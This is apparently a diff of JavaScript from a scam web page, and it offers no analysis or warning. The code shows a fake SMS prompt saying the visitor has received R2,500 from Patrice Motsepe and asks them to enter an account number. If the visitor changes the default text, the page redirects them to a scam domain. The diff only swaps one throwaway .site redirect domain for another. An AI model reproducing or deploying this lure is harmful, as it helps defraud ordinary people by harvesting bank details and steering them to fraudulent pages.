@@ -1,5 +1,5 @@
 var password = 'WITHDRAW R2,500'
 password=prompt('SMS: Congratulations, you are eligible to receive R2,500 From Patrice Motsepe, click OK to Enter Your Acc. Number','WITHDRAW R2,500');
 if (password != 'WITHDRAW R2,500') {
-location.href='https://www.itidgheghe.site/motsepe-r2500-gift';
+location.href='https://www.prickbbyr.site/motsepe-r2500-gift';
 }
